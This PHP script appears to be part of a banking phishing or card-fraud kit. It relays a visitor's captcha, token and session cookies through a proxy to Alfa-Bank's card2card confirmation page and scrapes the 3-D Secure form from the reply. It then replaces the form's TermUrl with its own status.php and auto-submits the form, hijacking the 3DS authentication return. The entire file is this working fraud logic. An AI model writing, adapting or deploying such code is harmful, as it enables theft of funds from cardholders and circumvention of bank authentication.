<?php
include $_SERVER['DOCUMENT_ROOT'].'/config.php';



  $ch = curl_init('https://www.alfaportal.ru/card2card/ptpl/alfaportal/confirm.html');
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: '.getallheaders()['User-Agent'],'Accept-Language: en-US,en;q=0.5','Accept-Encoding: gzip, deflate, br','Connection: keep-alive','Upgrade-Insecure-Requests: 1','Referer: https://www.alfaportal.ru/card2card/ptpl/alfaportal/confirm.html?ssn_token='.$_POST['ssn_token'],'Content-Type: application/x-www-form-urlencoded','Host: www.alfaportal.ru','Accept: text/html,application/xhtml+xm…plication/xml;q=0.9,*/*;q=0.8','Cookie: AP2P='.$_SESSION['cooc']['AP2P'].';JSESSIONID='.$_SESSION['cooc']['JSESSIONID'].';TS0184dca2='.$_SESSION['cooc']['TS0184dca2']));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
           curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'captcha='.$_POST['captcha'].'&ssn_token='.$_POST['ssn_token'].'&action_proceed=');
        $com = curl_exec($ch);
        $tsf1 = curl_getinfo($ch);
        curl_close($ch);
        
        
        preg_match_all('#<form id="postForm" action="(.+?)" method="POST">#is', $com, $action);
          preg_match_all('#<input type="hidden" name="PaReq" value="(.+?)">#is', $com, $PaReq);
              preg_match_all('#<input type="hidden" name="MD" value="(.+?)">#is', $com, $MD);
                preg_match_all('#<input type="hidden" name="TermUrl" value="(.+?)">#is', $com, $TermUrl);
                
                  $ab = isset($_SERVER['HTTPS']) ? 'https://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php' : 'https://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php';
     
             if(!isset($PaReq[1][0])){
    
    
    echo '3дс форма не построена!';
    exit();
}
     
        ?>
        </html>
        </body>
        <form id="postForm" action="<?=$action[1][0];?>" method="POST">
            <input type="hidden" name="PaReq" value="<?=$PaReq[1][0];?>">
            <input type="hidden" name="TermUrl" value="<?=$ab;?>">
            <input type="hidden" name="MD" value="<?=$MD[1][0];?>">
            </form><script>document.getElementById('postForm').submit();</script></body></html>